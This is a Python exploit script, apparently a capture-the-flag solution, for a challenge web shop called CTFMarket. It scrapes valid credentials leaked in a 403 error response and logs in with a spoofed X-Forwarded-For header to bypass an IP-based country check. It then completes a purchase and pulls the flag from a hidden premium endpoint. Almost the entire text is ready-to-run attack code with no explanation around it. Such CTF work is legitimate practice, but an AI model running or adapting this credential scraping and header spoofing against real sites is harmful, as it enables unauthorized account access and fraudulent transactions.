#!/usr/bin/env python3
import requests
import sys

def exploit(target_url):
    print("[*] CTFMarket Exploit")
    print(f"[*] Target: {target_url}")
    
    print("\n[+] Step 1: Getting test credentials...")
    login_url = f"{target_url}/api/auth"
    
    login_data = {
        "email": "fake@test.com",
        "password": "fakepassword"
    }
    
    response = requests.post(login_url, json=login_data)
    
    if response.status_code == 403:
        response_text = response.text
        print(f"[+] Got hint: {response_text[:100]}...")
        
        if "Email:" in response_text and "Password:" in response_text:
            import re
            email_match = re.search(r'Email:\s*([^<]+)<', response_text)
            password_match = re.search(r'Password:\s*([^<]+)<', response_text)
            
            if email_match and password_match:
                valid_email = email_match.group(1).strip()
                valid_password = password_match.group(1).strip()
                print(f"[+] Valid credentials found:")
                print(f"    Email: {valid_email}")
                print(f"    Password: {valid_password}")
    else:
        print("[!] Failed to get test credentials")
        return
    
    print("\n[+] Step 2: Authenticating with spoofed IP (Switzerland)...")
    
    spoofed_ip = "185.220.101.1"  # Zurich, Switzerland
    
    headers = {
        'Content-Type': 'application/json',
        'X-Forwarded-For': spoofed_ip  
    }
    
    login_data = {
        "email": valid_email,
        "password": valid_password
    }
    
    session = requests.Session()
    response = session.post(login_url, json=login_data, headers=headers)
    
    if response.status_code == 200:
        print(f"[+] Authentication successful!")
        print(f"[+] Used spoofed IP: {spoofed_ip}")
    else:
        print(f"[!] Authentication failed: {response.status_code}")
        return
    
    print("\n[+] Step 3: Checking shopping basket...")
    basket_url = f"{target_url}/api/basket"
    response = session.get(basket_url)
    
    if response.status_code == 200:
        basket_data = response.json()
        print(f"[+] Basket total: {basket_data}")
    
    print("\n[+] Step 4: Checking account balance...")
    account_url = f"{target_url}/api/account"
    response = session.get(account_url)
    
    if response.status_code == 200:
        account_data = response.json()['response']
        print(f"[+] Account balance: {account_data['coins']} CTFCoins")
        print(f"[+] Currency: {account_data.get('currency', 'N/A')}")
    
    print("\n[+] Step 5: Completing purchase...")
    purchase_url = f"{target_url}/api/purchase"
    response = session.post(purchase_url)
    
    if response.status_code == 200:
        print("[+] Purchase successful!")
    else:
        print(f"[!] Purchase failed: {response.status_code} - {response.text}")
        return
    
    print("\n[+] Step 6: Getting the flag...")
    flag_url = f"{target_url}/purchase-details?secret=premium"
    response = session.get(flag_url)
    
    if response.status_code == 200:
        flag_page = response.text
        if "CTFCup{" in flag_page or "ctfmarket{" in flag_page:
            import re
            flag_match = re.search(r'(CTFCup|ctfmarket)\{[^}]+\}', flag_page)
            if flag_match:
                flag = flag_match.group(0)
                print(f"\n[+] FLAG FOUND: {flag}")
                print("[+] Exploit successful!")
                return flag
        else:
            print("[!] Flag not found in response")
            print(f"Response: {flag_page[:200]}")
    else:
        print(f"[!] Failed to get flag: {response.status_code}")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <target_url>")
        print(f"Example: {sys.argv[0]} http://localhost:7331")
        sys.exit(1)
    
    target = sys.argv[1].rstrip('/')
    exploit(target)

